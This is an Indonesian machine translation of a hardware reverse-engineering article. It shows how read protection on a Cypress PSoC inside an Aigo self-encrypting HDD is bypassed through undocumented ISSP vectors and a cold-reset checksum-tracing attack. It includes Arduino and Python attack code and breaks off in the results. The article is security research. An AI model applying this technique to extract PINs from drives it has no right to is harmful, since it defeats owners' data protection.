<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👭 🙋🏼 🌴 Membalikkan dan meretas HDD eksternal Aigo yang mengenkripsi sendiri. Bagian 2: Membuang dengan Cypress PSoC 🏄 🤦🏾 ✍🏽</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Ini adalah bagian kedua dan terakhir dari artikel tentang meretas drive enkripsi diri eksternal. Saya mengingatkan Anda bahwa seorang rekan baru-baru ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Membalikkan dan meretas HDD eksternal Aigo yang mengenkripsi sendiri. Bagian 2: Membuang dengan Cypress PSoC</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/455529/"><p>  Ini adalah bagian kedua dan terakhir dari artikel tentang meretas drive enkripsi diri eksternal.  Saya mengingatkan Anda bahwa seorang rekan baru-baru ini membawakan saya hard drive Patriot (Aigo) SK8671, dan saya memutuskan untuk membalikkannya, dan sekarang saya membagikan apa yang dihasilkannya.  Sebelum membaca lebih lanjut, pastikan untuk membaca bagian <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">pertama</a> artikel. </p><br><p> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">4. Kami mulai menghapus dump dari PSoC flash drive internal</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">5. Protokol ISSP</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">- 5.1.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Apa itu ISSP?</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">- 5.2.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Demistifikasi vektor</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">- 5.3.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Ngobrol dengan PSoC</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">- 5.4.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Identifikasi register intra-chip</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">- 5.5.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Bit pelindung</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">6. Serangan pertama (gagal): ROMX</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">7. Serangan kedua: melacak dengan reset dingin</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">- 7.1.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Implementasi</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">- 7.2.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Baca hasilnya</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">- 7.3.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Rekonstruksi biner flash</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">- 7.4.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Temukan alamat penyimpanan kode PIN</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">- 7.5.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Kami membuang dump blok No. 126</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">- 7.6.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Pemulihan kode pin</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">8. Apa selanjutnya?</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">9. Kesimpulan</a> </p><br><p><img src="https://habrastorage.org/webt/wx/nm/gk/wxnmgkeurrmiurx87rujoynxrsq.jpeg"></p><a name="habracut"></a><br><a name="a4"></a><br><h1 id="4-nachinaem-snimat-damp-s-vnutrenney-fleshki-psoc">  4. Kami mulai menghapus dump dari PSoC flash drive internal </h1><br><p>  Jadi, semuanya menunjukkan (seperti yang kita tentukan di [bagian pertama] ()) bahwa kode PIN disimpan dalam isi perut flash PSoC.  Karena itu, kita perlu membaca flash flashel ini.  Depan pekerjaan yang diperlukan: </p><br><ul><li>  kendalikan "komunikasi" dengan mikrokontroler; </li><li>  temukan cara untuk memeriksa apakah "komunikasi" ini dilindungi dari pembacaan dari luar; </li><li>  menemukan jalan di sekitar keamanan. </li></ul><br><p>  Ada dua tempat di mana masuk akal untuk mencari kode PIN yang valid: </p><br><ul><li>  memori flash internal; </li><li>  SRAM, tempat kode pin dapat disimpan untuk membandingkannya dengan kode pin yang dimasukkan pengguna. </li></ul><br><p>  Ke depan, saya perhatikan bahwa saya masih berhasil menghapus dump dari PSoC flash drive internal, melewati sistem perlindungannya, dengan bantuan serangan perangkat keras "trace with cold reset", setelah membalikkan fitur yang tidak terdokumentasi dari protokol ISSP.  Ini memungkinkan saya untuk langsung membuang kode PIN saat ini. </p><br><pre><code class="plaintext hljs">$ ./psoc.py syncing: KO OK [...] PIN: 1 2 3 4 5 6 7 8 9</code> </pre> <br><p>  Kode program yang dihasilkan: </p><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Kode Arduino untuk HSSP</a> ; </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Driver Python dan disassembler ISSP</a> . </li></ul><br><a name="a5"></a><br><h1 id="5-issp-protokol">  5. Protokol ISSP </h1><br><a name="a51"></a><br><h2 id="51-chto-takoe-issp">  5.1.  Apa itu ISSP? </h2><br><p>  "Komunikasi" dengan mikrokontroler dapat berarti hal yang berbeda: dari "vendor ke vendor", hingga interaksi menggunakan protokol serial (misalnya, ICSP untuk PIC Microchip). </p><br><p>  Cypress memiliki protokol sendiri untuk hal ini, yang disebut ISSP (in-system serial programming protocol), yang sebagian dijelaskan dalam <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">spesifikasi teknis</a> .  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">US7185162</a> juga menyediakan beberapa informasi.  Ada juga analog OpenSource yang disebut HSSP (kami akan menggunakannya sedikit nanti).  ISSP berfungsi sebagai berikut: </p><br><ul><li>  restart PSoC; </li><li>  bawa nomor ajaib ke kaki data serial PSoC ini;  untuk memasuki mode pemrograman eksternal; </li><li>  mengirim perintah yang merupakan string bit panjang yang disebut "vektor". </li></ul><br><p>  Dalam dokumentasi ISSP, vektor-vektor ini didefinisikan hanya untuk segelintir perintah: </p><br><ul><li>  Inisialisasi-1 </li><li>  Inisialisasi-2 </li><li>  Inisialisasi-3 (opsi 3V dan 5V) </li><li>  ID-SETUP </li><li>  BACA-ID-KATA </li><li>  SET-BLOCK-NUM: 10011111010dddddddd111, di mana dddddddd = blok # </li><li>  BASE ERASE </li><li>  PROGRAM-BLOK </li><li>  SETELAH VERIFIKASI </li><li>  BACA-BYTE: 10110aaaaaaZDDDDDDDDZ1, di mana DDDDDDDDD = data keluar, aaaaaa = alamat (6 bit) </li><li>  WRITE-BYTE: 10010aaaaaadddddddd111, di mana ddddddddd = data in, aaaaaa = address (6 bits) </li><li>  Aman </li><li>  CHECKSUM-SETUP </li><li>  BACA-LIHAT </li><li>  ERASE BLOCK </li></ul><br><p>  Misalnya, vektor untuk Inisialisasi-2: </p><br><pre> <code class="plaintext hljs">1101111011100000000111 1101111011000000000111 1001111100000111010111 1001111100100000011111 1101111010100000000111 1101111010000000011111 1001111101110000000111 1101111100100110000111 1101111101001000000111 1001111101000000001111 1101111000000000110111 1101111100000000000111 1101111111100010010111</code> </pre> <br><p>  Semua vektor memiliki panjang yang sama: 22 bit.  Dokumentasi HSSP memiliki beberapa informasi tambahan tentang ISSP: "Vektor ISSP tidak lebih dari sekuens bit yang mewakili sekumpulan instruksi." </p><br><a name="a52"></a><br><h2 id="52-demistifikaciya-vektorov">  5.2.  Demistifikasi vektor </h2><br><p>  Mari kita lihat apa yang terjadi di sini.  Awalnya, saya berasumsi bahwa vektor yang sama ini adalah varian mentah dari instruksi M8C, namun, setelah menguji hipotesis ini, saya menemukan bahwa opcodes operasi tidak cocok. </p><br><p>  Kemudian saya mencari di vektor di atas, dan menemukan studi <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">ini</a> , di mana penulis, meskipun tidak membahas secara rinci, memberikan beberapa petunjuk praktis: “Setiap instruksi dimulai dengan tiga bit yang sesuai dengan salah satu dari empat mnemonik (baca dari RAM, tulis ke RAM , baca register, tulis register).  Kemudian datang alamat 8-bit, diikuti oleh 8 bit data (baik baca atau tulis) dan akhirnya tiga bit berhenti. " </p><br><p>  Kemudian saya dapat mengumpulkan beberapa informasi yang sangat berguna dari bagian Supervisory ROM (SROM) dari <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">manual teknis</a> .  SROM adalah ROM hard-coded di PSoC yang menyediakan fungsi layanan (mirip dengan Syscall) untuk kode perangkat lunak yang berjalan di ruang pengguna: </p><br><ul><li>  00h: SWBootReset </li><li>  01h: ReadBlock </li><li>  02h: WriteBlock </li><li>  03h: EraseBlock </li><li>  06h: TableRead </li><li>  07h: CheckSum </li><li>  08j: Kalibrasi0 </li><li>  09h: Kalibrasi1 </li></ul><br><p>  Membandingkan nama vektor dengan fungsi SROM, kita dapat memetakan berbagai operasi yang didukung oleh protokol ini ke parameter SROM yang diharapkan.  Berkat ini, kita dapat mendekode tiga bit pertama vektor ISSP: </p><br><ul><li>  100 =&gt; “wrmem” </li><li>  101 =&gt; “rdmem” </li><li>  110 =&gt; “wrreg” </li><li>  111 =&gt; “rdreg” </li></ul><br><p>  Namun, pemahaman penuh tentang proses intra-chip hanya dapat diperoleh melalui komunikasi langsung dengan PSoC. </p><br><a name="a53"></a><br><h2 id="53-obschenie-s-psoc">  5.3.  Ngobrol dengan PSoC </h2><br><p>  Karena Dirk Petrautsky telah <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">mem-porting</a> kode HSSP Cypress ke Arduino, saya menggunakan Arduino Uno untuk menghubungkan papan keyboard ke konektor ISSP. </p><br><p>  Harap dicatat bahwa selama penelitian saya, saya cukup banyak mengubah kode Dirk.  Anda dapat menemukan modifikasi saya di GitHub: di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">sini adalah</a> skrip Python yang sesuai untuk berkomunikasi dengan Arduino, di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">cypress_psoc_tools</a> repositori saya. </p><br><p>  Jadi, menggunakan Arduino, pada awalnya saya hanya menggunakan vektor "resmi" untuk "komunikasi".  Saya mencoba membaca ROM internal menggunakan perintah VERIFY.  Seperti yang diharapkan, saya tidak bisa melakukan ini.  Mungkin karena fakta bahwa bit proteksi baca diaktifkan di dalam flash drive. </p><br><p>  Kemudian saya membuat beberapa vektor sederhana saya untuk menulis dan membaca memori / register.  Harap dicatat bahwa kami dapat membaca seluruh SROM, meskipun flash drive terlindungi! </p><br><a name="a54"></a><br><h2 id="54-identifikaciya-vnutrichipovyh-registrov">  5.4.  Identifikasi register intra-chip </h2><br><p>  Melihat vektor "dibongkar", saya menemukan bahwa perangkat menggunakan register tidak berdokumen (0xF8-0xFA) untuk menunjukkan opcode M8C yang dieksekusi secara langsung, melewati perlindungan.  Ini memungkinkan saya untuk menjalankan berbagai opcode seperti "ADD", "MOV A, X", "PUSH" atau "JMP".  Berkat mereka (melihat efek samping yang mereka miliki pada register), saya dapat menentukan register mana yang tidak terdaftar yang sebenarnya merupakan register biasa (A, X, SP dan PC). </p><br><p>  Akibatnya, kode "dibongkar" yang dihasilkan oleh alat HSSP_disas.rb terlihat seperti ini (untuk kejelasan, saya menambahkan komentar): </p><br><pre> <code class="plaintext hljs">--== init2 ==-- [DE E0 1C] wrreg CPU_F (f7), 0x00 #   [DE C0 1C] wrreg SP (f6), 0x00 #  SP [9F 07 5C] wrmem KEY1, 0x3A #    SSC [9F 20 7C] wrmem KEY2, 0x03 #  [DE A0 1C] wrreg PCh (f5), 0x00 #  PC (MSB) ... [DE 80 7C] wrreg PCl (f4), 0x03 # (LSB) ...  3 ?? [9F 70 1C] wrmem POINTER, 0x80 # RAM-    [DF 26 1C] wrreg opc1 (f9), 0x30 #  1 =&gt; "HALT" [DF 48 1C] wrreg opc2 (fa), 0x40 #  2 =&gt; "NOP" [9F 40 3C] wrmem BLOCKID, 0x01 # BLOCK ID   SSC [DE 00 DC] wrreg A (f0), 0x06 #  "Syscall" : TableRead [DF 00 1C] wrreg opc0 (f8), 0x00 #   SSC, "Supervisory SROM Call" [DF E2 5C] wrreg CPU_SCR0 (ff), 0x12 #  :   </code> </pre> <br><a name="a55"></a><br><h2 id="55-zaschitnye-bity">  5.5.  Bit pelindung </h2><br><p>  Pada tahap ini, saya sudah dapat berkomunikasi dengan PSoC, tetapi saya masih belum memiliki informasi yang dapat dipercaya tentang bit pelindung flash drive.  Saya sangat terkejut oleh fakta bahwa Cypress tidak memberikan pengguna perangkat sarana untuk memeriksa apakah perlindungan diaktifkan.  Saya masuk jauh ke Google untuk akhirnya memahami bahwa kode HSSP yang disediakan oleh Cypress diperbarui setelah Dirk merilis modifikasinya.  Dan begitulah!  Berikut ini adalah vektor baru seperti ini: </p><br><pre> <code class="plaintext hljs">[DE E0 1C] wrreg CPU_F (f7), 0x00 [DE C0 1C] wrreg SP (f6), 0x00 [9F 07 5C] wrmem KEY1, 0x3A [9F 20 7C] wrmem KEY2, 0x03 [9F A0 1C] wrmem 0xFD, 0x00 #   [9F E0 1C] wrmem 0xFF, 0x00 #  [DE A0 1C] wrreg PCh (f5), 0x00 [DE 80 7C] wrreg PCl (f4), 0x03 [9F 70 1C] wrmem POINTER, 0x80 [DF 26 1C] wrreg opc1 (f9), 0x30 [DF 48 1C] wrreg opc2 (fa), 0x40 [DE 02 1C] wrreg A (f0), 0x10 #  syscall ! [DF 00 1C] wrreg opc0 (f8), 0x00 [DF E2 5C] wrreg CPU_SCR0 (ff), 0x12</code> </pre> <br><p>  Dengan menggunakan vektor ini (lihat read_security_data di psoc.py), kita mendapatkan semua bit perlindungan dalam SRAM pada 0x80, di mana setiap bit dilindungi dengan dua bit. </p><br><p>  Hasilnya menyedihkan: semuanya dilindungi dalam mode "nonaktifkan membaca eksternal dan menulis".  Oleh karena itu, kita tidak hanya dapat membaca apa pun dari USB flash drive, tetapi juga menulisnya (misalnya, untuk memperkenalkan ROM dumper di sana).  Dan satu-satunya cara untuk menonaktifkan perlindungan adalah dengan menghapus seluruh chip.  :-( </p><br><a name="a6"></a><br><h1 id="6-pervaya-neudavshayasya-ataka-romx">  6. Serangan pertama (gagal): ROMX </h1><br><p>  Namun, kita dapat mencoba trik berikut: karena kita memiliki kemampuan untuk mengeksekusi opcode sewenang-wenang, mengapa tidak menjalankan ROMX, yang digunakan untuk membaca memori flash?  Pendekatan ini memiliki peluang keberhasilan yang baik.  Karena fungsi ReadBlock, yang membaca data dari SROM (yang digunakan oleh vektor), memeriksa untuk melihat apakah itu dipanggil dari ISSP.  Namun, opcode ROMX, mungkin, mungkin tidak memiliki pemeriksaan seperti itu.  Jadi, inilah kode Python (setelah menambahkan beberapa kelas pembantu ke kode Arduino C): </p><br><pre> <code class="plaintext hljs">for i in range(0, 8192): write_reg(0xF0, i&gt;&gt;8) # A = 0 write_reg(0xF3, i&amp;0xFF) # X = 0 exec_opcodes("\x28\x30\x40") # ROMX, HALT, NOP byte = read_reg(0xF0) # ROMX reads ROM[A|X] into A print "%02x" % ord(byte[0]) # print ROM byte</code> </pre> <br><p>  Sayangnya, kode ini tidak berfungsi.  :-( Alih-alih, itu berfungsi, tetapi pada output kita mendapatkan opcodes kita sendiri (0x28 0x30 0x40)! Saya tidak berpikir bahwa fungsi perangkat yang sesuai adalah elemen perlindungan baca. Ini lebih seperti trik rekayasa: ketika menjalankan opcode eksternal, bus ROM dialihkan ke buffer sementara. </p><br><a name="a7"></a><br><h1 id="7-vtoraya-ataka-trassirovka-s-holodnoy-perezagruzkoy">  7. Serangan kedua: melacak dengan reset dingin </h1><br><p>  Karena trik ROMX tidak berhasil, saya mulai merenungkan variasi lain dari trik ini - dijelaskan dalam publikasi <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">“Menumpahkan terlalu banyak Cahaya pada Perlindungan Firmware Mikrokontroler”</a> . </p><br><a name="a71"></a><br><h2 id="71-realizaciya">  7.1.  Implementasi </h2><br><p>  Vektor berikut untuk CHECKSUM-SETUP tercantum dalam dokumentasi ISSP: </p><br><pre> <code class="plaintext hljs">[DE E0 1C] wrreg CPU_F (f7), 0x00 [DE C0 1C] wrreg SP (f6), 0x00 [9F 07 5C] wrmem KEY1, 0x3A [9F 20 7C] wrmem KEY2, 0x03 [DE A0 1C] wrreg PCh (f5), 0x00 [DE 80 7C] wrreg PCl (f4), 0x03 [9F 70 1C] wrmem POINTER, 0x80 [DF 26 1C] wrreg opc1 (f9), 0x30 [DF 48 1C] wrreg opc2 (fa), 0x40 [9F 40 1C] wrmem BLOCKID, 0x00 [DE 00 FC] wrreg A (f0), 0x07 [DF 00 1C] wrreg opc0 (f8), 0x00 [DF E2 5C] wrreg CPU_SCR0 (ff), 0x12</code> </pre> <br><p>  Ini pada dasarnya memanggil fungsi SROM 0x07, seperti yang disajikan dalam dokumentasi (italics mine): </p><br><blockquote>  Fungsi ini checksum checksum.  Ini menghitung checksum 16-bit dari jumlah blok yang ditetapkan oleh pengguna dalam satu bank flash, menghitung dari nol.  Parameter BLOCKID digunakan untuk mentransfer jumlah blok yang akan digunakan saat menghitung checksum.  Nilai "1" akan menghitung checksum hanya untuk blok nol;  sementara <em>"0" akan mengarah pada fakta bahwa total checksum dari semua 256 blok bank flash akan dihitung.</em>  <em>Sebuah checksum 16-bit dikembalikan melalui KEY1 dan KEY2.</em>  Dalam parameter KEY1, 8 bit rendah checksum diperbaiki, dan dalam KEY2, 8 bit tinggi dicatat.  Untuk perangkat dengan banyak bank flash, fungsi checksum dipanggil untuk masing-masing secara terpisah.  Nomor bank yang akan digunakan diatur oleh register FLS_PR1 (dengan mengatur sedikit di dalamnya sesuai dengan bank flash target). </blockquote><p>  Perhatikan bahwa ini adalah checksum paling sederhana: byte hanya dijumlahkan satu per satu;  tidak ada kebiasaan CRC yang canggih.  Selain itu, mengetahui bahwa set register di inti M8C sangat kecil, saya berasumsi bahwa ketika menghitung checksum, nilai-nilai perantara akan diperbaiki dalam variabel yang sama yang pada akhirnya akan menjadi output: KEY1 (0xF8) / KEY2 (0xF9). </p><br><p>  Jadi, secara teori, serangan saya terlihat seperti ini: </p><br><ol><li>  Terhubung melalui ISSP. </li><li>  Kami memulai perhitungan checksum menggunakan vektor CHECKSUM-SETUP. </li><li>  Kami me-reboot prosesor setelah waktu yang ditentukan T. </li><li>  Baca RAM untuk mendapatkan checksum C. saat ini </li><li>  Ulangi langkah 3 dan 4, setiap kali meningkatkan T. </li><li>  Kami memulihkan data dari flash drive dengan mengurangi checksum C sebelumnya dari yang sekarang. </li></ol><br><p>  Namun, muncul masalah: vektor Initialize-1, yang harus kami kirim setelah reboot, menimpa KEY1 dan KEY2: </p><br><pre> <code class="plaintext hljs">1100101000000000000000 # ,  PSoC    nop nop nop nop nop [DE E0 1C] wrreg CPU_F (f7), 0x00 [DE C0 1C] wrreg SP (f6), 0x00 [9F 07 5C] wrmem KEY1, 0x3A #     [9F 20 7C] wrmem KEY2, 0x03 #   [DE A0 1C] wrreg PCh (f5), 0x00 [DE 80 7C] wrreg PCl (f4), 0x03 [9F 70 1C] wrmem POINTER, 0x80 [DF 26 1C] wrreg opc1 (f9), 0x30 [DF 48 1C] wrreg opc2 (fa), 0x40 [DE 01 3C] wrreg A (f0), 0x09 # SROM- 9 [DF 00 1C] wrreg opc0 (f8), 0x00 # SSC [DF E2 5C] wrreg CPU_SCR0 (ff), 0x12</code> </pre> <br><p>  Kode ini menimpa checksum berharga kami dengan memanggil Calibrate1 (fungsi SROM 9) ... Mungkin kita bisa masuk ke mode pemrograman dengan mengirim nomor ajaib (dari awal kode di atas) dan kemudian membaca SRAM?  Dan ya, itu berhasil!  Kode Arduino yang mengimplementasikan serangan ini cukup sederhana: </p><br><pre> <code class="cpp hljs"><span class="hljs-keyword"><span class="hljs-keyword">case</span></span> Cmnd_STK_START_CSUM: checksum_delay = ((<span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span>)getch())&lt;&lt;<span class="hljs-number"><span class="hljs-number">24</span></span>; checksum_delay |= ((<span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span>)getch())&lt;&lt;<span class="hljs-number"><span class="hljs-number">16</span></span>; checksum_delay |= ((<span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span>)getch())&lt;&lt;<span class="hljs-number"><span class="hljs-number">8</span></span>; checksum_delay |= getch(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(checksum_delay &gt; <span class="hljs-number"><span class="hljs-number">10000</span></span>) { ms_delay = checksum_delay/<span class="hljs-number"><span class="hljs-number">1000</span></span>; checksum_delay = checksum_delay%<span class="hljs-number"><span class="hljs-number">1000</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { ms_delay = <span class="hljs-number"><span class="hljs-number">0</span></span>; } send_checksum_v(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(checksum_delay) delayMicroseconds(checksum_delay); delay(ms_delay); start_pmode();</code> </pre> <br><ol><li>  Baca checkum_delay. </li><li>  Jalankan perhitungan checksum (send_checksum_v). </li><li>  Tunggu periode waktu tertentu;  diberikan perangkap berikut: <br><ul><li>  Saya menghabiskan banyak waktu sampai saya menemukan bahwa <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">delayMicroseconds ternyata</a> berfungsi dengan benar hanya dengan penundaan tidak melebihi 16383mks; </li><li>  dan sekali lagi membunuh jumlah waktu yang sama sampai menemukan bahwa delayMicroseconds, jika melewati 0 ke inputnya, bekerja dengan sangat salah! </li></ul></li><li>  Muat ulang PSoC ke mode pemrograman (cukup kirim nomor ajaib, tanpa mengirim inisialisasi vektor). </li></ol><br><p>  Kode Python yang dihasilkan: </p><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">for</span></span> delay <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">150000</span></span>): <span class="hljs-comment"><span class="hljs-comment">#    for i in range(0, 10): #      try: reset_psoc(quiet=True) #       send_vectors() #    ser.write("\x85"+struct.pack("&gt;I", delay)) #    +    res = ser.read(1) #  arduino ACK except Exception as e: print e ser.close() os.system("timeout -s KILL 1s picocom -b 115200 /dev/ttyACM0 2&gt;&amp;1 &gt; /dev/null") ser = serial.Serial('/dev/ttyACM0', 115200, timeout=0.5) #    continue print "%05d %02X %02X %02X" % (delay, #  RAM- read_regb(0xf1), read_ramb(0xf8), read_ramb(0xf9))</span></span></code> </pre> <br><p>  Singkatnya, apa yang dilakukan kode ini: </p><br><ol><li>  Memuat ulang PSoC (dan mengirimkannya nomor ajaib). </li><li>  Mengirim vektor inisialisasi penuh. </li><li>  Memanggil fungsi Arduino Cmnd_STK_START_CSUM (0x85), di mana keterlambatan dalam mikrodetik dilewatkan sebagai parameter. </li><li>  Membaca checksum (0xF8 dan 0xF9) dan register 0xF1 yang tidak berdokumen. </li></ol><br><p>  Kode ini dieksekusi 10 kali dalam 1 mikrodetik.  0xF1 termasuk di sini karena hanya register yang berubah ketika menghitung checksum.  Mungkin ini adalah semacam variabel sementara yang digunakan oleh perangkat logika aritmatika.  Perhatikan hack jelek yang saya restart Arduino menggunakan picocom ketika Arduino berhenti memberi tanda-tanda kehidupan (saya tidak tahu mengapa). </p><br><a name="a72"></a><br><h2 id="72-schityvaem-rezultat">  7.2.  Baca hasilnya </h2><br><p>  Hasil skrip Python terlihat seperti ini (disederhanakan agar mudah dibaca): </p><br><pre> <code class="plaintext hljs">DELAY F1 F8 F9 # F1 –    # F8     # F9     00000 03 E1 19 [...] 00016 F9 00 03 00016 F9 00 00 00016 F9 00 03 00016 F9 00 03 00016 F9 00 03 00016 F9 00 00 #     0 00017 FB 00 00 [...] 00023 F8 00 00 00024 80 80 00 # 1- : 0x0080-0x0000 = 0x80 00024 80 80 00 00024 80 80 00 [...] 00057 CC E7 00 # 2- : 0xE7-0x80: 0x67 00057 CC E7 00 00057 01 17 01 #   ,    00057 01 17 01 00057 01 17 01 00058 D0 17 01 00058 D0 17 01 00058 D0 17 01 00058 D0 17 01 